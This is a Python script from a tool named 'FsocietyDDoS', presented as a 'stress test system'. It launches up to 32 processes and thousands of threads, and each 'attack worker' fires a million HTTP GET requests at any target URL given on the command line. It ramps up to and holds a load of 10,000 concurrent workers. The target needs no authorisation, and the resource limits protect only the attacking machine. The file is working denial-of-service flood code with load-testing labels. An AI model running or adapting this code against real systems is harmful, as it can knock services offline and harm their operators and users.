#!/usr/bin/env python3
"""
FsocietyDDoS Stress Test System
Advanced stress testing for system limits and stability
"""

import asyncio
import time
import threading
import psutil
import os
import sys
import gc
import signal
import json
from datetime import datetime, timedelta
from dataclasses import dataclass, asdict
from typing import Dict, List, Optional, Tuple, Any, Callable
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor, as_completed
import multiprocessing as mp
import queue
import traceback
import random

# Add parent directory to path for imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from fsociety_ddos import HighPerformanceAttackThreadCLI
from async_attack_methods import HighPerformanceAsyncAttacker
from core.memory_manager import MemoryManager, BufferManager

@dataclass
class StressTestConfig:
    """Stress test configuration"""
    target_url: str
    max_duration: int = 300  # 5 minutes max
    ramp_up_time: int = 60   # Gradual increase over 1 minute
    ramp_down_time: int = 30 # Gradual decrease over 30 seconds
    max_concurrency: int = 10000
    max_processes: int = None
    max_threads_per_process: int = 1000
    memory_limit_gb: int = 16
    cpu_limit_percent: int = 95
    network_limit_mbps: int = 1000
    failure_threshold: float = 50.0  # Stop if failure rate > 50%
    output_dir: str = "stress_test_results"
    enable_resource_monitoring: bool = True
    enable_auto_scaling: bool = True
    enable_failure_recovery: bool = True
    
    def __post_init__(self):
        if self.max_processes is None:
            self.max_processes = min(psutil.cpu_count(), 32)

@dataclass
class StressTestMetrics:
    """Stress test metrics"""
    timestamp: float
    active_processes: int
    active_threads: int
    active_connections: int
    requests_per_second: float
    success_rate: float
    failure_rate: float
    cpu_usage: float
    memory_usage_gb: float
    network_sent_mbps: float
    network_received_mbps: float
    response_time_avg: float
    response_time_p95: float
    response_time_p99: float
    errors_per_second: float
    system_load: float

class StressTestController:
    """Advanced stress test controller"""
    
    def __init__(self, config: StressTestConfig):
        self.config = config
        self.active = False
        self.start_time = None
        self.end_time = None
        
        # Process and thread management
        self.processes: List[mp.Process] = []
        self.process_queues: List[mp.Queue] = []
        self.thread_pools: List[ThreadPoolExecutor] = []
        
        # Monitoring and metrics
        self.metrics_history: List[StressTestMetrics] = []
        self.monitoring_thread = None
        self.control_thread = None
        
        # Resource managers
        self.memory_manager = MemoryManager()
        self.buffer_manager = BufferManager()
        
        # State tracking
        self.current_concurrency = 0
        self.target_concurrency = 0
        self.failure_count = 0
        self.success_count = 0
        self.total_requests = 0
        
        # Create output directory
        os.makedirs(config.output_dir, exist_ok=True)
        
        # Setup signal handlers for graceful shutdown
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)
    
    def run_stress_test(self) -> Dict[str, Any]:
        """Run comprehensive stress test"""
        print(f"[STRESS TEST] Starting comprehensive stress test")
        print(f"[STRESS TEST] Target: {self.config.target_url}")
        print(f"[STRESS TEST] Max Duration: {self.config.max_duration}s")
        print(f"[STRESS TEST] Max Concurrency: {self.config.max_concurrency}")
        print(f"[STRESS TEST] Max Processes: {self.config.max_processes}")
        
        self.start_time = time.time()
        self.active = True
        
        try:
            # Start monitoring
            if self.config.enable_resource_monitoring:
                self._start_monitoring()
            
            # Start control loop
            self._start_control_loop()
            
            # Run stress test phases
            self._run_stress_test_phases()
            
            # Generate results
            results = self._generate_stress_test_results()
            
            return results
            
        except Exception as e:
            print(f"[ERROR] Stress test failed: {e}")
            traceback.print_exc()
            return {"error": str(e)}
        
        finally:
            self._cleanup_all_resources()
    
    def _run_stress_test_phases(self):
        """Run stress test phases: ramp-up, sustain, ramp-down"""
        
        # Phase 1: Ramp-up
        print(f"[PHASE 1] Ramp-up phase ({self.config.ramp_up_time}s)")
        self._run_ramp_up_phase()
        
        # Phase 2: Sustain maximum load
        sustain_time = self.config.max_duration - self.config.ramp_up_time - self.config.ramp_down_time
        if sustain_time > 0:
            print(f"[PHASE 2] Sustain phase ({sustain_time}s)")
            self._run_sustain_phase(sustain_time)
        
        # Phase 3: Ramp-down
        print(f"[PHASE 3] Ramp-down phase ({self.config.ramp_down_time}s)")
        self._run_ramp_down_phase()
    
    def _run_ramp_up_phase(self):
        """Gradually increase load to maximum"""
        start_time = time.time()
        
        while (time.time() - start_time) < self.config.ramp_up_time and self.active:
            # Calculate target concurrency based on time elapsed
            elapsed_ratio = (time.time() - start_time) / self.config.ramp_up_time
            self.target_concurrency = int(self.config.max_concurrency * elapsed_ratio)
            
            # Adjust current load
            self._adjust_load()
            
            # Check system limits
            if not self._check_system_limits():
                print("[WARNING] System limits reached during ramp-up")
                break
            
            time.sleep(1)
    
    def _run_sustain_phase(self, duration: int):
        """Sustain maximum load"""
        self.target_concurrency = self.config.max_concurrency
        start_time = time.time()
        
        while (time.time() - start_time) < duration and self.active:
            # Maintain maximum load
            self._adjust_load()
            
            # Check system limits and failure rates
            if not self._check_system_limits():
                print("[WARNING] System limits exceeded during sustain phase")
                break
            
            if not self._check_failure_threshold():
                print("[WARNING] Failure threshold exceeded during sustain phase")
                break
            
            time.sleep(1)
    
    def _run_ramp_down_phase(self):
        """Gradually decrease load to zero"""
        start_time = time.time()
        initial_concurrency = self.current_concurrency
        
        while (time.time() - start_time) < self.config.ramp_down_time and self.active:
            # Calculate target concurrency based on time elapsed
            elapsed_ratio = (time.time() - start_time) / self.config.ramp_down_time
            remaining_ratio = 1.0 - elapsed_ratio
            self.target_concurrency = int(initial_concurrency * remaining_ratio)
            
            # Adjust current load
            self._adjust_load()
            
            time.sleep(1)
        
        # Ensure all load is stopped
        self.target_concurrency = 0
        self._adjust_load()
    
    def _adjust_load(self):
        """Adjust current load to match target concurrency"""
        if self.target_concurrency > self.current_concurrency:
            # Scale up
            self._scale_up(self.target_concurrency - self.current_concurrency)
        elif self.target_concurrency < self.current_concurrency:
            # Scale down
            self._scale_down(self.current_concurrency - self.target_concurrency)
    
    def _scale_up(self, additional_concurrency: int):
        """Scale up load by adding processes/threads"""
        if not self.config.enable_auto_scaling:
            return
        
        # Calculate optimal distribution
        processes_needed = min(
            additional_concurrency // self.config.max_threads_per_process + 1,
            self.config.max_processes - len(self.processes)
        )
        
        for _ in range(processes_needed):
            if len(self.processes) >= self.config.max_processes:
                break
            
            # Create new process
            process_queue = mp.Queue()
            process = mp.Process(
                target=self._worker_process,
                args=(process_queue, self.config.max_threads_per_process)
            )
            
            process.start()
            self.processes.append(process)
            self.process_queues.append(process_queue)
            
            # Send start command
            process_queue.put({
                'command': 'start',
                'target_url': self.config.target_url,
                'concurrency': min(additional_concurrency, self.config.max_threads_per_process)
            })
            
            additional_concurrency -= self.config.max_threads_per_process
            self.current_concurrency += self.config.max_threads_per_process
            
            if additional_concurrency <= 0:
                break
    
    def _scale_down(self, reduce_concurrency: int):
        """Scale down load by removing processes/threads"""
        if not self.config.enable_auto_scaling:
            return
        
        # Stop processes from the end
        while reduce_concurrency > 0 and self.processes:
            # Send stop command to last process
            if self.process_queues:
                try:
                    self.process_queues[-1].put({'command': 'stop'}, timeout=1)
                except:
                    pass
            
            # Remove process
            if self.processes:
                process = self.processes.pop()
                if self.process_queues:
                    self.process_queues.pop()
                
                # Wait for process to terminate
                process.join(timeout=5)
                if process.is_alive():
                    process.terminate()
                    process.join(timeout=2)
                
                reduce_concurrency -= self.config.max_threads_per_process
                self.current_concurrency -= self.config.max_threads_per_process
    
    def _worker_process(self, command_queue: mp.Queue, max_threads: int):
        """Worker process for handling load generation"""
        active_threads = []
        thread_pool = None
        
        try:
            while True:
                try:
                    # Check for commands
                    command = command_queue.get(timeout=1)
                    
                    if command['command'] == 'start':
                        # Start attack threads
                        target_url = command['target_url']
                        concurrency = command['concurrency']
                        
                        thread_pool = ThreadPoolExecutor(max_workers=concurrency)
                        
                        # Submit attack tasks
                        for _ in range(concurrency):
                            future = thread_pool.submit(self._attack_worker, target_url)
                            active_threads.append(future)
                    
                    elif command['command'] == 'stop':
                        break
                
                except queue.Empty:
                    continue
                except Exception as e:
                    print(f"[ERROR] Worker process error: {e}")
                    break
        
        finally:
            # Cleanup
            if thread_pool:
                thread_pool.shutdown(wait=False)
    
    def _attack_worker(self, target_url: str):
        """Individual attack worker"""
        try:
            # Create attack instance
            attacker = HighPerformanceAttackThreadCLI(
                target=target_url,
                num_requests=1000000,  # Large number for continuous operation
                method="GET",
                concurrency=1
            )
            
            # Run attack
            attacker.run()
            
        except Exception as e:
            self.failure_count += 1
            print(f"[ERROR] Attack worker failed: {e}")
    
    def _check_system_limits(self) -> bool:
        """Check if system limits are exceeded"""
        try:
            # Check CPU usage
            cpu_percent = psutil.cpu_percent(interval=1)
            if cpu_percent > self.config.cpu_limit_percent:
                print(f"[LIMIT] CPU usage exceeded: {cpu_percent:.1f}% > {self.config.cpu_limit_percent}%")
                return False
            
            # Check memory usage
            memory = psutil.virtual_memory()
            memory_gb = (memory.total - memory.available) / (1024**3)
            if memory_gb > self.config.memory_limit_gb:
                print(f"[LIMIT] Memory usage exceeded: {memory_gb:.1f}GB > {self.config.memory_limit_gb}GB")
                return False
            
            # Check network usage (if available)
            try:
                network = psutil.net_io_counters()
                # This is a simplified check - in practice, you'd need to calculate actual bandwidth
                # For now, we'll just check if network counters are increasing rapidly
            except:
                pass
            
            return True
            
        except Exception as e:
            print(f"[ERROR] System limit check failed: {e}")
            return False
    
    def _check_failure_threshold(self) -> bool:
        """Check if failure rate exceeds threshold"""
        if self.total_requests == 0:
            return True
        
        failure_rate = (self.failure_count / self.total_requests) * 100
        if failure_rate > self.config.failure_threshold:
            print(f"[THRESHOLD] Failure rate exceeded: {failure_rate:.1f}% > {self.config.failure_threshold}%")
            return False
        
        return True
    
    def _start_monitoring(self):
        """Start system monitoring"""
        self.monitoring_thread = threading.Thread(target=self._monitoring_loop)
        self.monitoring_thread.start()
    
    def _start_control_loop(self):
        """Start control loop"""
        self.control_thread = threading.Thread(target=self._control_loop)
        self.control_thread.start()
    
    def _monitoring_loop(self):
        """Monitoring loop for collecting metrics"""
        last_network = psutil.net_io_counters()
        last_time = time.time()
        
        while self.active:
            try:
                current_time = time.time()
                time_delta = current_time - last_time
                
                # Collect system metrics
                cpu_percent = psutil.cpu_percent()
                memory = psutil.virtual_memory()
                network = psutil.net_io_counters()
                load_avg = psutil.getloadavg() if hasattr(psutil, 'getloadavg') else [0, 0, 0]
                
                # Calculate network speed
                network_sent_mbps = 0
                network_received_mbps = 0
                if time_delta > 0:
                    bytes_sent_delta = network.bytes_sent - last_network.bytes_sent
                    bytes_recv_delta = network.bytes_recv - last_network.bytes_recv
                    network_sent_mbps = (bytes_sent_delta * 8) / (time_delta * 1024 * 1024)
                    network_received_mbps = (bytes_recv_delta * 8) / (time_delta * 1024 * 1024)
                
                # Create metrics
                metrics = StressTestMetrics(
                    timestamp=current_time,
                    active_processes=len(self.processes),
                    active_threads=threading.active_count(),
                    active_connections=self.current_concurrency,
                    requests_per_second=0,  # Will be calculated from attack results
                    success_rate=0,
                    failure_rate=0,
                    cpu_usage=cpu_percent,
                    memory_usage_gb=(memory.total - memory.available) / (1024**3),
                    network_sent_mbps=network_sent_mbps,
                    network_received_mbps=network_received_mbps,
                    response_time_avg=0,
                    response_time_p95=0,
                    response_time_p99=0,
                    errors_per_second=0,
                    system_load=load_avg[0] if load_avg else 0
                )
                
                self.metrics_history.append(metrics)
                
                # Update for next iteration
                last_network = network
                last_time = current_time
                
                # Print status every 10 seconds
                if len(self.metrics_history) % 20 == 0:  # Every 10 seconds (0.5s interval)
                    self._print_status(metrics)
                
            except Exception as e:
                print(f"[ERROR] Monitoring error: {e}")
            
            time.sleep(0.5)
    
    def _control_loop(self):
        """Control loop for managing test execution"""
        while self.active:
            try:
                # Check if test should continue
                if self.start_time and (time.time() - self.start_time) > self.config.max_duration:
                    print("[INFO] Maximum test duration reached")
                    self.active = False
                    break
                
                # Check system health
                if not self._check_system_limits():
                    if self.config.enable_failure_recovery:
                        print("[RECOVERY] Attempting to reduce load due to system limits")
                        self.target_concurrency = max(0, int(self.target_concurrency * 0.8))
                    else:
                        print("[STOP] Stopping test due to system limits")
                        self.active = False
                        break
                
                # Check failure threshold
                if not self._check_failure_threshold():
                    if self.config.enable_failure_recovery:
                        print("[RECOVERY] Attempting to reduce load due to high failure rate")
                        self.target_concurrency = max(0, int(self.target_concurrency * 0.9))
                    else:
                        print("[STOP] Stopping test due to high failure rate")
                        self.active = False
                        break
                
            except Exception as e:
                print(f"[ERROR] Control loop error: {e}")
            
            time.sleep(5)
    
    def _print_status(self, metrics: StressTestMetrics):
        """Print current status"""
        elapsed = time.time() - self.start_time if self.start_time else 0
        
        print(f"[STATUS] Time: {elapsed:.0f}s | "
              f"Processes: {metrics.active_processes} | "
              f"Threads: {metrics.active_threads} | "
              f"Connections: {metrics.active_connections} | "
              f"CPU: {metrics.cpu_usage:.1f}% | "
              f"Memory: {metrics.memory_usage_gb:.1f}GB | "
              f"Network: ↑{metrics.network_sent_mbps:.1f}Mbps ↓{metrics.network_received_mbps:.1f}Mbps")
    
    def _generate_stress_test_results(self) -> Dict[str, Any]:
        """Generate comprehensive stress test results"""
        self.end_time = time.time()
        total_duration = self.end_time - self.start_time if self.start_time else 0
        
        results = {
            'config': asdict(self.config),
            'summary': {
                'total_duration': total_duration,
                'max_processes': max([m.active_processes for m in self.metrics_history], default=0),
                'max_threads': max([m.active_threads for m in self.metrics_history], default=0),
                'max_connections': max([m.active_connections for m in self.metrics_history], default=0),
                'max_cpu_usage': max([m.cpu_usage for m in self.metrics_history], default=0),
                'max_memory_usage': max([m.memory_usage_gb for m in self.metrics_history], default=0),
                'max_network_sent': max([m.network_sent_mbps for m in self.metrics_history], default=0),
                'max_network_received': max([m.network_received_mbps for m in self.metrics_history], default=0),
                'total_requests': self.total_requests,
                'total_failures': self.failure_count,
                'total_successes': self.success_count,
                'overall_success_rate': (self.success_count / self.total_requests * 100) if self.total_requests > 0 else 0
            },
            'metrics_history': [asdict(m) for m in self.metrics_history],
            'timestamp': datetime.now().isoformat()
        }
        
        # Save results
        results_file = os.path.join(self.config.output_dir, f"stress_test_results_{int(time.time())}.json")
        with open(results_file, 'w') as f:
            json.dump(results, f, indent=2)
        
        print(f"[RESULTS] Stress test results saved to: {results_file}")
        
        return results
    
    def _signal_handler(self, signum, frame):
        """Handle shutdown signals"""
        print(f"\n[SIGNAL] Received signal {signum}, shutting down gracefully...")
        self.active = False
    
    def _cleanup_all_resources(self):
        """Cleanup all resources"""
        print("[CLEANUP] Cleaning up all resources...")
        
        # Stop all processes
        for i, process in enumerate(self.processes):
            try:
                if self.process_queues and i < len(self.process_queues):
                    self.process_queues[i].put({'command': 'stop'}, timeout=1)
            except:
                pass
            
            process.join(timeout=5)
            if process.is_alive():
                process.terminate()
                process.join(timeout=2)
        
        # Stop monitoring
        self.active = False
        if self.monitoring_thread:
            self.monitoring_thread.join(timeout=5)
        if self.control_thread:
            self.control_thread.join(timeout=5)
        
        # Cleanup memory
        gc.collect()
        
        print("[CLEANUP] Resource cleanup completed")

def run_stress_test(target_url: str, **kwargs) -> Dict[str, Any]:
    """Run stress test with given configuration"""
    config = StressTestConfig(target_url=target_url, **kwargs)
    controller = StressTestController(config)
    return controller.run_stress_test()

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="FsocietyDDoS Stress Test")
    parser.add_argument("target", help="Target URL for stress test")
    parser.add_argument("--max-duration", type=int, default=300, help="Maximum test duration in seconds")
    parser.add_argument("--max-concurrency", type=int, default=10000, help="Maximum concurrency level")
    parser.add_argument("--max-processes", type=int, help="Maximum number of processes")
    parser.add_argument("--ramp-up-time", type=int, default=60, help="Ramp-up time in seconds")
    parser.add_argument("--ramp-down-time", type=int, default=30, help="Ramp-down time in seconds")
    parser.add_argument("--memory-limit", type=int, default=16, help="Memory limit in GB")
    parser.add_argument("--cpu-limit", type=int, default=95, help="CPU limit percentage")
    parser.add_argument("--failure-threshold", type=float, default=50.0, help="Failure rate threshold percentage")
    parser.add_argument("--output-dir", default="stress_test_results", help="Output directory")
    parser.add_argument("--disable-auto-scaling", action="store_true", help="Disable auto scaling")
    parser.add_argument("--disable-failure-recovery", action="store_true", help="Disable failure recovery")
    
    args = parser.parse_args()
    
    # Run stress test
    config = StressTestConfig(
        target_url=args.target,
        max_duration=args.max_duration,
        max_concurrency=args.max_concurrency,
        max_processes=args.max_processes,
        ramp_up_time=args.ramp_up_time,
        ramp_down_time=args.ramp_down_time,
        memory_limit_gb=args.memory_limit,
        cpu_limit_percent=args.cpu_limit,
        failure_threshold=args.failure_threshold,
        output_dir=args.output_dir,
        enable_auto_scaling=not args.disable_auto_scaling,
        enable_failure_recovery=not args.disable_failure_recovery
    )
    
    controller = StressTestController(config)
    results = controller.run_stress_test()
    
    print("\n[STRESS TEST] Test completed!")
    print(f"[RESULTS] Max Concurrency Achieved: {results['summary']['max_connections']}")
    print(f"[RESULTS] Max CPU Usage: {results['summary']['max_cpu_usage']:.1f}%")
    print(f"[RESULTS] Max Memory Usage: {results['summary']['max_memory_usage']:.1f}GB")
    print(f"[RESULTS] Check detailed results in: {args.output_dir}")